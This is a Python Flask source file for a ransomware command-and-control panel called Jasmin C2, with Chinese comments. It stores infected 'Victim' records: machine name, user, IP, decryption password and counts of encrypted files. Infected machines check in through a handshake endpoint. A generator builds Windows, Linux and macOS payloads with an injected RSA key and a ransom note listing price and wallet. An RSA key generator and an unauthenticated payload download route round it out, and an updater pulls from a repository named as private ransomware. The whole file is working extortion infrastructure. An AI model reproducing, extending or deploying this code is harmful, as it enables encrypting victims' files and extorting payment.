#!/usr/bin/env python3
"""Jasmin C2 — Python Flask Backend with MySQL + Web Install Wizard"""
import os, secrets, json, datetime
from functools import wraps
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory, flash
from flask_sqlalchemy import SQLAlchemy
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))

CONFIG_FILE = os.path.join(os.path.dirname(__file__), 'config.json')
PAYLOAD_DIR = os.path.join(os.path.dirname(__file__), 'payloads')
TEMPLATE_DIR = os.path.join(os.path.dirname(__file__), 'templates', 'payloads')
os.makedirs(PAYLOAD_DIR, exist_ok=True)

def load_config():
    if os.path.exists(CONFIG_FILE):
        return json.load(open(CONFIG_FILE))
    return {}

def is_installed():
    cfg = load_config()
    return cfg.get('installed', False)

cfg = load_config()
db_url = cfg.get('database_url', os.environ.get('DATABASE_URL', 'sqlite:///jasmin.db'))
app.config['SQLALCHEMY_DATABASE_URI'] = db_url
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['HANDSHAKE_SECRET'] = cfg.get('handshake_secret', os.environ.get('HANDSHAKE_SECRET', 'jasmin@123'))

db = SQLAlchemy(app)

class Admin(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(255), unique=True, nullable=False)
    password = db.Column(db.String(255), nullable=False)

class Victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_name = db.Column(db.String(255))
    computer_user = db.Column(db.String(255))
    os = db.Column(db.String(100))
    date = db.Column(db.String(100))
    time = db.Column(db.String(50))
    ip = db.Column(db.String(45))
    location = db.Column(db.String(255))
    systemid = db.Column(db.String(255))
    password = db.Column(db.String(255))
    encrypted_count = db.Column(db.Integer, default=0)
    encrypted_size = db.Column(db.BigInteger, default=0)
    encrypted_types = db.Column(db.Text, default='')
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)

def login_required(f):
    @wraps(f)
    def decorated(*args, **kw):
        if 'username' not in session:
            return redirect(url_for('login'))
        return f(*args, **kw)
    return decorated

# ── Install Wizard ──
@app.route('/install', methods=['GET','POST'])
def install():
    if is_installed():
        return redirect(url_for('login'))
    step = request.args.get('step', 1, type=int)
    error = ''
    if request.method == 'POST':
        if step == 2:
            host = request.form.get('db_host','localhost')
            port = request.form.get('db_port','3306')
            name = request.form.get('db_name','jasmin_db')
            user = request.form.get('db_user','')
            pw = request.form.get('db_pass','')
            secret = request.form.get('secret','jasmin@123')
            url = f'mysql+pymysql://{user}:{pw}@{host}:{port}/{name}?charset=utf8mb4'
            try:
                import pymysql
                conn = pymysql.connect(host=host,port=int(port),user=user,password=pw)
                cur = conn.cursor()
                cur.execute(f"CREATE DATABASE IF NOT EXISTS `{name}` DEFAULT CHARACTER SET utf8mb4")
                conn.close()
                cfg = {'database_url':url,'handshake_secret':secret,'installed':False}
                json.dump(cfg, open(CONFIG_FILE,'w'))
                app.config['SQLALCHEMY_DATABASE_URI'] = url
                app.config['HANDSHAKE_SECRET'] = secret
                db.engine.dispose()
                with app.app_context():
                    db.create_all()
                return redirect(url_for('install', step=3))
            except Exception as e:
                error = f'数据库连接失败: {e}'
        elif step == 3:
            au = request.form.get('admin_user','admin')
            ap_ = request.form.get('admin_pass','')
            ap2 = request.form.get('admin_pass2','')
            if len(ap_) < 6: error = '密码至少6位'
            elif ap_ != ap2: error = '两次密码不一致'
            else:
                with app.app_context():
                    Admin.query.filter_by(username=au).delete()
                    db.session.add(Admin(username=au, password=generate_password_hash(ap_)))
                    db.session.commit()
                cfg = load_config()
                cfg['installed'] = True
                json.dump(cfg, open(CONFIG_FILE,'w'))
                return redirect(url_for('install', step=4))
    return render_template('install.html', step=step, error=error,
        env_docker=os.path.exists('/.dockerenv'))

# ── Auth ──
@app.route('/')
def index():
    if not is_installed(): return redirect(url_for('install'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET','POST'])
def login():
    if not is_installed(): return redirect(url_for('install'))
    if 'username' in session: return redirect(url_for('dashboard'))
    if request.method == 'POST':
        u = request.form.get('username','')
        p = request.form.get('password','')
        admin = Admin.query.filter_by(username=u).first()
        if admin and check_password_hash(admin.password, p):
            session['username'] = admin.username
            return redirect(url_for('dashboard'))
        flash('Access Denied','error')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# ── Dashboard ──
@app.route('/dashboard')
@login_required
def dashboard():
    page = request.args.get('pageno', 1, type=int)
    search = request.args.get('search', '').strip()
    per_page = 10
    q = Victim.query
    if search:
        like = f'%{search}%'
        q = q.filter(db.or_(
            Victim.machine_name.like(like), Victim.computer_user.like(like),
            Victim.os.like(like), Victim.ip.like(like),
            Victim.location.like(like), Victim.systemid.like(like)))
    total = q.count()
    victims = q.order_by(Victim.id.desc()).offset((page-1)*per_page).limit(per_page).all()
    total_pages = max(1, -(-total // per_page))
    return render_template('dashboard.html', victims=victims, page=page,
        total_pages=total_pages, total=total, search=search, version=CURRENT_VERSION)

# ── Handshake ──
@app.route('/handshake', methods=['POST'])
def handshake():
    if request.form.get('handshake') != app.config['HANDSHAKE_SECRET']:
        return 'Invalid', 403
    v = Victim(machine_name=request.form.get('machine_name',''),
        computer_user=request.form.get('computer_user',''),
        os=request.form.get('os',''), date=request.form.get('date',''),
        time=request.form.get('time',''), ip=request.form.get('ip',request.remote_addr),
        location=request.form.get('location',''), systemid=request.form.get('systemid',''),
        password=request.form.get('password',''),
        encrypted_count=int(request.form.get('encrypted_count',0) or 0),
        encrypted_size=int(request.form.get('encrypted_size',0) or 0),
        encrypted_types=request.form.get('encrypted_types',''))
    db.session.add(v); db.session.commit()
    return 'handshake completed'

# ── Payload Generator ──
@app.route('/generate', methods=['POST'])
@login_required
def generate():
    plat = request.form.get('platform','')
    c2 = request.form.get('c2_url','')
    sec = request.form.get('secret', app.config['HANDSHAKE_SECRET'])
    ransom = {
        'title': request.form.get('ransom_title','YOUR FILES HAVE BEEN ENCRYPTED'),
        'contact': request.form.get('ransom_contact',''),
        'body': request.form.get('ransom_body',''),
        'price': request.form.get('ransom_price',''),
        'wallet': request.form.get('ransom_wallet',''),
    }
    if plat not in ('win','linux','macos'):
        return jsonify(ok=False, msg='无效平台')
    ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    tok = secrets.token_hex(4)
    tpl_map = {'win':'win_payload.tpl','linux':'linux_payload.tpl','macos':'macos_payload.tpl'}
    ext_map = {'win':'.cs','linux':'.py','macos':'.py'}
    tpl_path = os.path.join(TEMPLATE_DIR, tpl_map[plat])
    if not os.path.exists(tpl_path):
        return jsonify(ok=False, msg='模板文件缺失')
    tpl = open(tpl_path).read().replace('{{C2_URL}}',c2).replace('{{HANDSHAKE}}',sec)
    # 注入RSA公钥
    pub_path = os.path.join(PAYLOAD_DIR, 'jasmin_public.pem')
    if os.path.exists(pub_path):
        tpl = tpl.replace('{{RSA_PUBLIC_KEY}}', open(pub_path).read().strip())
    else:
        return jsonify(ok=False, msg='RSA公钥缺失，请先生成密钥对')
    # 构建勒索信
    dec = '运行 Jasmin_Decryptor.exe → 选择.pem私钥' if plat=='win' else 'pip3 install cryptography && python3 jasmin_decrypt.py key.pem'
    note = f"╔══════════════════════════════════════════╗\n║  {ransom['title']}\n║  你的文件已被加密\n╚══════════════════════════════════════════╝\n\n系统ID: {{sid}}\n\n{ransom['body']}\n"
    if ransom['price']: note += f"\n💰 赎金: {ransom['price']}"
    if ransom['wallet']: note += f"\n💳 支付地址: {ransom['wallet']}"
    if ransom['contact']: note += f"\n📧 {ransom['contact']}"
    note += f"\n\n🔓 解密方法:\n{dec}\n\n✅ SHA-256 校验确保文件100%还原"
    tpl = tpl.replace('{{RANSOM_NOTE}}', note.replace("'","\\'").replace('"','\\"'))
    for k,v in ransom.items():
        tpl = tpl.replace('{{RANSOM_'+k.upper()+'}}', v.replace("'","\\'"))
    name = f'jasmin_{plat}_{ts}_{tok}{ext_map[plat]}'
    with open(os.path.join(PAYLOAD_DIR, name), 'w') as f: f.write(tpl)
    return jsonify(ok=True, file=name, platform=plat, size=os.path.getsize(os.path.join(PAYLOAD_DIR,name)))

@app.route('/payloads/<path:filename>')
def download_payload(filename):
    return send_from_directory(PAYLOAD_DIR, filename, as_attachment=True)

# ── Update Check ──
_vf = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'VERSION')
if not os.path.exists(_vf):
    _vf = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'VERSION')
CURRENT_VERSION = open(_vf).read().strip() if os.path.exists(_vf) else '0.0.0'

@app.route('/update')
@login_required
def check_update():
    import urllib.request
    token = os.environ.get('GIT_TOKEN','')
    headers = {'User-Agent':'Jasmin-C2'}
    if token: headers['Authorization'] = f'token {token}'
    # 获取远程VERSION
    remote_ver = ''
    try:
        req = urllib.request.Request('https://raw.githubusercontent.com/2016xyz/Jasmin-Ransomware-Private/master/VERSION', headers=headers)
        remote_ver = urllib.request.urlopen(req, timeout=10).read().decode().strip()
    except: pass
    # 获取最新commit
    sha=date=msg=''
    try:
        req2 = urllib.request.Request('https://api.github.com/repos/2016xyz/Jasmin-Ransomware-Private/commits?per_page=1', headers=headers)
        data = json.loads(urllib.request.urlopen(req2, timeout=10).read())
        sha = data[0]['sha'][:7]
        date = data[0]['commit']['committer']['date']
        msg = data[0]['commit']['message']
    except: pass
    if not remote_ver and not sha:
        return jsonify(ok=True, current=CURRENT_VERSION, update=False, msg='无法连接更新服务器')
    has_update = bool(remote_ver and remote_ver != CURRENT_VERSION)
    return jsonify(ok=True, update=has_update, current=CURRENT_VERSION,
        latest=remote_ver or CURRENT_VERSION, latest_commit=sha, date=date, message=msg)

# ── KeyGen ──
@app.route('/keygen', methods=['POST'])
@login_required
def keygen():
    from cryptography.hazmat.primitives.asymmetric import rsa as rsa_gen
    from cryptography.hazmat.primitives import serialization as ser
    from cryptography.hazmat.backends import default_backend
    key = rsa_gen.generate_private_key(65537, 2048, default_backend())
    priv = key.private_bytes(ser.Encoding.PEM, ser.PrivateFormat.TraditionalOpenSSL, ser.NoEncryption())
    pub = key.public_key().public_bytes(ser.Encoding.PEM, ser.PublicFormat.SubjectPublicKeyInfo)
    priv_path = os.path.join(PAYLOAD_DIR, 'jasmin_private.pem')
    pub_path = os.path.join(PAYLOAD_DIR, 'jasmin_public.pem')
    open(priv_path, 'wb').write(priv)
    open(pub_path, 'wb').write(pub)
    return jsonify(ok=True, pub=pub.decode(), msg='密钥对已生成并保存到 payloads/ 目录')

@app.route('/do_update', methods=['POST'])
@login_required
def do_update():
    import subprocess, zipfile, tempfile, shutil, urllib.request
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    token = os.environ.get('GIT_TOKEN','')
    # 方式1: git pull
    if os.path.isdir(os.path.join(root, '.git')):
        r = subprocess.run(['git', 'pull'], cwd=root, capture_output=True, text=True, timeout=30)
        return jsonify(ok=True, method='git pull', output=r.stdout + r.stderr)
    # 方式2: zip下载覆盖
    url = f'https://api.github.com/repos/2016xyz/Jasmin-Ransomware-Private/zipball/master'
    req = urllib.request.Request(url, headers={'User-Agent':'Jasmin-C2'})
    if token:
        req.add_header('Authorization', f'token {token}')
    try:
        resp = urllib.request.urlopen(req, timeout=30)
        tmp = tempfile.mktemp(suffix='.zip')
        with open(tmp, 'wb') as f:
            f.write(resp.read())
        tmpdir = tempfile.mkdtemp()
        with zipfile.ZipFile(tmp, 'r') as zf:
            zf.extractall(tmpdir)
        os.unlink(tmp)
        # 找到解压后的子目录
        dirs = [d for d in os.listdir(tmpdir) if os.path.isdir(os.path.join(tmpdir, d))]
        if not dirs:
            return jsonify(ok=False, msg='解压后未找到目录')
        src = os.path.join(tmpdir, dirs[0], 'Web Panel Python')
        if os.path.isdir(src):
            # 覆盖当前app目录(保留config.json和payloads)
            for item in os.listdir(src):
                s = os.path.join(src, item)
                d = os.path.join('/app', item)
                if item in ('config.json', 'payloads'):
                    continue
                if os.path.isdir(s):
                    if os.path.exists(d): shutil.rmtree(d)
                    shutil.copytree(s, d)
                else:
                    shutil.copy2(s, d)
        shutil.rmtree(tmpdir)
        return jsonify(ok=True, method='zip下载', msg='更新完成，请刷新页面')
    except Exception as e:
        return jsonify(ok=False, msg=f'下载更新失败: {e}')

# ── Startup ──
if __name__ == '__main__':
    if is_installed():
        with app.app_context(): db.create_all()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
